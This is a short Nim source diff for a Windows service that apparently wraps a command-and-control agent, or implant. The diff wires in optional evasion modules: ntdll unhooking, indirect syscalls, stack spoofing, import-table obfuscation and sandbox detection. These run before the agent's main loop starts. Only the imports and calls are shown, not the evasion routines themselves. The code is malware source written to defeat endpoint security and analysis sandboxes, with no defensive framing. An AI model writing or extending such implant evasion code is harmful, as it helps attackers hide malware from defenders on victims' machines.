@@ -4,6 +4,12 @@ import std/os
 import utils/strenc
 
 when defined(windows):
+  # Evasion imports
+  when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+    import utils/evasion
+  when defined(sandbox_evasion):
+    import utils/sandbox
+
   var
     serviceStatus: SERVICE_STATUS
     serviceStatusHandle: SERVICE_STATUS_HANDLE
@@ -18,6 +24,12 @@ when defined(windows):
   # Agent thread wrapper
   proc agentThreadProc(lpParameter: LPVOID): DWORD {.stdcall.} =
     try:
+      # Run sandbox evasion before anything else
+      when defined(sandbox_evasion):
+        runSandboxEvasion()
+      # Run evasion techniques before agent starts
+      when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
+        runEvasionInit()
       # Call the shared agent main loop
       runAgent()
     except:
